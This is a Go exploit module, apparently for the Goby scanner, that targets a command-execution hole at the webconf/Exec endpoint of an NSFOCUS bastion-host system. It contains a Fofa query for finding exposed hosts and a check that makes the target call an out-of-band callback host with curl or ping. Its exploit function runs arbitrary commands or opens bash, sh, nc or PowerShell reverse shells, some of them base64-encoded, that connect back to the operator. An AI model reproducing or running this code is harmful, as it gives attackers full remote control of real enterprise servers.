package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "nsfocus OSMS webconf/Exec Command Execution Vulnerability",
    "Description": "<p>The Neusoft Operation and Maintenance Security Management System (commonly known as Bastion Host, abbreviated as OSMS in English) is centered on the \"Zero Trust\" principle and is built on the foundation of 4A management—Account, Authentication, Authorization, and Audit. Expanding on the traditional bastion host, it implements the Zero Trust principle across multiple dimensions, including account and identity, endpoint and network, application and permissions, as well as orchestration and analysis. This system establishes a comprehensive lifecycle operation and maintenance security management framework, encompassing endpoint security baselines, MFA identity authentication, adaptive dynamic authorization, and full-process security auditing. In addition to meeting compliance requirements for Classified Protection and Confidentiality Assessment , it significantly enhances operational security levels, thereby supporting enterprises in strengthening their information security.</p>",
    "Product": "Green-Alliance-Enterprise-Security-Center",
    "Homepage": "https://www.nsfocus.com.cn/html/2019/212_0926/20.html",
    "DisclosureDate": "2024-08-16",
    "PostTime": "2024-08-16",
    "Author": "1538279017@qq.com",
    "FofaQuery": "body=\"'/needUsbkey.php?username='\" && (body=\"绿盟科技\" || body=\"堡垒机\")",
    "GobyQuery": "body=\"'/needUsbkey.php?username='\" && (body=\"绿盟科技\" || body=\"堡垒机\")",
    "Level": "3",
    "Impact": "<p>Remote Command Execution (RCE) vulnerabilities can allow attackers to execute arbitrary commands on the target server, leading to a complete system compromise, data theft, or unauthorized access to sensitive information.</p>",
    "Recommendation": "<p>Validate and sanitize all user inputs to ensure they do not contain malicious commands or special characters that could be executed by the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash,BySh,ByNcBsd",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "HW-2024",
        "2H1W"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "绿盟堡垒机 webconf/Exec 命令执行 漏洞",
            "Product": "绿盟堡垒机",
            "Description": "<p>绿盟运维安全管理系统（俗称堡垒机，英文简称OSMS）以“零信任”为核心，“账号、认证、授权、审计”4A管理为基础，在传统堡垒机的基础上，从账号和身份、终端和网络、应用和权限、编排和分析等多维度贯彻零信任原则，打造覆盖终端安全基线、MFA身份认证、自适应动态授权、全流程安全审计的全生命周期运维安全管理体系，在满足等保/密评合规要求的基础上，大幅提升运维安全水平，助力企业信息安全建设。<br></p>",
            "Recommendation": "<p>对所有用户输入进行验证和清理，确保其中不包含可能被系统执行的恶意命令或特殊字符。<br></p>",
            "Impact": "<p>远程命令执行（RCE）漏洞可能允许攻击者在目标服务器上执行任意命令，导致系统被完全攻陷、数据被窃取或未授权访问敏感信息<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "HW-2024",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "nsfocus OSMS webconf/Exec Command Execution Vulnerability",
            "Product": "Green-Alliance-Enterprise-Security-Center",
            "Description": "<p>The Neusoft Operation and Maintenance Security Management System (commonly known as Bastion Host, abbreviated as OSMS in English) is centered on the \"Zero Trust\" principle and is built on the foundation of 4A management—Account, Authentication, Authorization, and Audit. Expanding on the traditional bastion host, it implements the Zero Trust principle across multiple dimensions, including account and identity, endpoint and network, application and permissions, as well as orchestration and analysis. This system establishes a comprehensive lifecycle operation and maintenance security management framework, encompassing endpoint security baselines, MFA identity authentication, adaptive dynamic authorization, and full-process security auditing. In addition to meeting compliance requirements for Classified Protection and Confidentiality Assessment , it significantly enhances operational security levels, thereby supporting enterprises in strengthening their information security.<br></p>",
            "Recommendation": "<p>Validate and sanitize all user inputs to ensure they do not contain malicious commands or special characters that could be executed by the system.<br></p>",
            "Impact": "<p>Remote Command Execution (RCE) vulnerabilities can allow attackers to execute arbitrary commands on the target server, leading to a complete system compromise, data theft, or unauthorized access to sensitive information.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "HW-2024",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9933"
}`

	setPayloadRequest_dsdfodsmdcsld := func(hostInfo *httpclient.FixUrl, command string) (ok bool, vulURL string, err error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 12
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}
		vulURL = "/webconf/Exec/index?cmd=" + url.QueryEscape(command)
		res, err := setGetRequest(hostInfo, vulURL, map[string]string{})
		if err != nil {
			return false, "", err
		}
		if res.StatusCode != 200 {
			return false, vulURL, err
		}
		return true, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequest_dsdfodsmdcsld

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			checkStr := goutils.RandomHexString(8)
			checkUrl, isDomain := godclient.GetGodCheckURL(checkStr)

			//请注意：若漏洞环境特殊，可自行修改为wget、或其他能够出发HTTPLog的命令，由于部分godserver没有域名，所以尽量使用HTTPLog的方式
			pocCommand := "curl " + checkUrl
			if isDomain {
				pocCommand = "ping " + checkUrl
			}

			ok, vulUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil || !ok {
				return false
			}
			if godclient.PullExists(checkStr, time.Second*15) {
				ss.VulURL = hostInfo.FixedHostInfo + vulUrl
				return true
			}

			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//请注意：在此处将setPayloadRequestHash0001函数赋值给runPayload
			runPayload := setPayloadRequest_dsdfodsmdcsld

			//请注意：后续代码为模板代码，非特殊情况，无需更改
			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				ok, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				if !ok {
					expResult.Success = false
					expResult.Output = "执行失败"
				}
				expResult.Success = true
				expResult.Output = "执行成功,该漏洞无回显,请自行判断执行效果"
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])
				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
